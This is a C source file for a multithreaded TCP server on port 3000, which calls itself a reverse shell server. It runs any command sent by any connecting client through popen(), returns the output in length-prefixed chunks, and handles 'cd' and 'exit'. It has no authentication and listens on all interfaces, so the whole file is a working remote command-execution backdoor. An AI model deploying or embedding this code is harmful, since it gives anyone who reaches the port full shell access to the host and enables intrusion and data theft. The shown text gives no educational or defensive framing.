#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>

#define PORT 3000           // Port number for the server
#define BUFFER_SIZE 1024    // Buffer size for data transfer
#define MAX_CHUNK_SIZE 1024 // Maximum chunk size for data transfer

// Function to check if a string is empty or is empty
int is_empty(const char *s)
{
    while (*s)
    {
        // Check if the current character is not a whitespace character
        if (!isspace((unsigned char)*s))
        {
            return 0;
        }
        s++;
    }
    // If the loop finishes, the string is empty
    return 1;
}

// Function to send data in chunks
void send_chunked_data(int client_sock, const char *data, size_t data_len)
{
    size_t bytes_sent = 0;

    // Send data in chunks
    while (bytes_sent < data_len)
    {
        // Calculate chunk size
        size_t remaining = data_len - bytes_sent;
        int chunk_size = remaining < MAX_CHUNK_SIZE ? remaining : MAX_CHUNK_SIZE;

        // Send chunk size in network byte order
        int network_chunk_size = htonl(chunk_size);

        // Send the chunk size to the client
        if (send(client_sock, &network_chunk_size, sizeof(int), 0) < 0)
        {
            perror("Failed to send chunk size");
            return;
        }

        // Send chunk data
        if (send(client_sock, data + bytes_sent, chunk_size, 0) < 0)
        {
            perror("Failed to send chunk data");
            return;
        }

        bytes_sent += chunk_size; // Update the number of bytes sent
    }

    // Send a zero-size chunk to show end of data
    int end_of_data = 0;
    send(client_sock, &end_of_data, sizeof(int), 0);
}

// Function to handle clients
void *client_handler(void *arg)
{
    // Get the client socket from the argument
    int client_sock = *(int *)arg;
    free(arg);

    char command[BUFFER_SIZE]; // Command buffer
    char buffer[BUFFER_SIZE];  // Buffer for receiving data
    ssize_t num_read;          // Number of bytes read

    while (1)
    {
        memset(command, 0, sizeof(command)); // Clear the command buffer

        num_read = recv(client_sock, command, sizeof(command) - 1, 0); // Receive data from the client

        // Check if the connection is closed
        if (num_read <= 0)
        {
            perror("recv failed or connection closed");
            break;
        }

        command[num_read] = '\0'; // Terminate the command

        // Skip command if it's empty
        if (is_empty(command))
        {
            const char *empty_msg = "No command sent.\n";
            send_chunked_data(client_sock, empty_msg, strlen(empty_msg)); // Send the message to the client if the command is empty
            continue;
        }

        // Check for "exit" command
        if (strncmp(command, "exit", 4) == 0)
        {
            break;
        }

        // Handling the "cd" command
        if (strncmp(command, "cd ", 3) == 0)
        {
            char output[BUFFER_SIZE];
            char *dir = command + 3; // Get the directory from the command

            // If the directory is empty, set it to the home directory
            if (dir[0] == '\0')
            {
                dir = getenv("HOME");
            }

            // Change the directory
            if (chdir(dir) != 0)
            {
                snprintf(output, sizeof(output), "cd: %s: %s\n", dir, strerror(errno));
            }
            else
            {
                char cwd[1024];

                // Get the current working directory
                if (getcwd(cwd, sizeof(cwd)) != NULL)
                {
                    snprintf(output, sizeof(output), "Directory changed to: %s\n", cwd); // Set the output to the current working directory
                }
                else
                {
                    snprintf(output, sizeof(output), "Error changing directory\n"); // Set the output to the error message
                }
            }
            send_chunked_data(client_sock, output, strlen(output)); // Send the output to the client
            continue;
        }

        // Execute other commands with popen()
        FILE *fp = popen(command, "r");

        // Check if the command failed to execute
        if (fp == NULL)
        {
            const char *error_msg = "Failed to execute command.\n";
            send_chunked_data(client_sock, error_msg, strlen(error_msg)); // Send the error message to the client
            continue;                                                     // Skip the rest of the loop
        }
        else
        {
            // Read and send command output in chunks
            size_t bytes_read;
            while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0)
            {
                // Send this chunk of data in network byte order
                int chunk_size = htonl(bytes_read);
                send(client_sock, &chunk_size, sizeof(int), 0); // Send the chunk size to the client
                send(client_sock, buffer, bytes_read, 0);       // Send the chunk data to the client
            }

            // Signal for end of data
            int end_of_data = 0;
            send(client_sock, &end_of_data, sizeof(int), 0);

            pclose(fp);
        }
    }

    close(client_sock);

    pthread_exit(NULL);
}

int main()
{
    int server_sock, *client_sock_ptr;               // Server socket and client socket pointer
    struct sockaddr_in server_addr, client_addr;     // Server address and client address
    socklen_t client_addr_len = sizeof(client_addr); // Client address length

    // Create the server socket
    if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    memset(&(server_addr.sin_zero), '\0', 8); // Clear the server address

    // Bind the server socket to the server address
    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("bind failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(server_sock, 5) < 0)
    {
        perror("listen failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    printf("Reverse shell server listening on port %d...\n", PORT);

    // Accept incoming connections
    while (1)
    {
        int *client_sock = malloc(sizeof(int));

        // Accept incoming connections
        if ((*client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_addr_len)) < 0)
        {
            perror("accept failed");
            free(client_sock);
            continue;
        }

        // Print the connection details
        printf("Connection accepted from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        pthread_t thread_id; // Create a thread for the client

        if (pthread_create(&thread_id, NULL, client_handler, client_sock) != 0)
        {
            perror("Failed to create thread");
            close(*client_sock);
            free(client_sock);
            continue;
        }

        pthread_detach(thread_id); // Detach the thread
    }

    // Close the server socket
    close(server_sock);
    return 0;
}
